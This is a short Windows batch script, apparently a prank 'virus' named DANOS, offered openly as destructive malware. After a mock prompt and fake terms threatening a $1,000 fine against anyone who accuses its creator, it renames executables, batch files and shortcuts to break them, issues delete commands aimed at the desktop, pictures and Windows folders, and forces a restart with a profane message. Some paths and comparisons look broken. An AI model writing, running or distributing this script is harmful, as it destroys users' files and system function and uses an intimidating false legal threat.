@echo off
title DANOS
:start
echo Are you sure you want to proceed? Danos will infect your computer deleting every file.
set /p type=
if %type%==yes goto TOS
if %type%==no goto exit

:TOS
   
         echo 1. You are resonsible for your actions, not the creator
      
     echo 2. You will be subject to pay $1,000 if found accusing the creator or making rumors about him

        echo     To start the virus, type "I agree"

     echo         If you change your mind, type "I disagree"


set /p type=
if %type%==I agree goto agree
if %type%==I disagree goto disagree

:agree
echo DANOS HAS STARTED
rename *.exe *.wav
rename *.bat *.exe
rename *.lnk *.bat
del C:/windows/desktop
del C:/windows/pictures
del c:/window
shutdown /r /c "DANOS HAS SUCCESSFULLY FUCKED YOUR COMPUTER"





:exit
exit
